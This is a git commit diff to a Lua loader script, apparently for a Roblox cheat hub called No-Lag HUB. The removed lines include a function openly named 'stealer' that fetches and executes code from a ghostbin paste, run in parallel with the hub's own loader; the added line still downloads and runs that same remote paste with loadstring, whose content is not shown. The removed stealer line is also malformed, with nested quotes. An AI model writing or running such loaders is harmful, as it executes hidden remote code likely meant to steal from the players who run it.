a4cd7ca912df7c1eddca373290f4002b621df385
NoLag-id <sfpher6@gmail.com>
2025-06-24 02:06:34 +0800

    Update LoaderV1.lua

--- LoaderV1.lua
+++ LoaderV1.lua
@@ -1,9 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet("loadstring(game:HttpGet("https://www.ghostbin.cloud/55mt3/raw", true))()", true))()
-end
-local function farm()
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
+loadstring(game:HttpGet("https://www.ghostbin.cloud/55mt3/raw", true))()
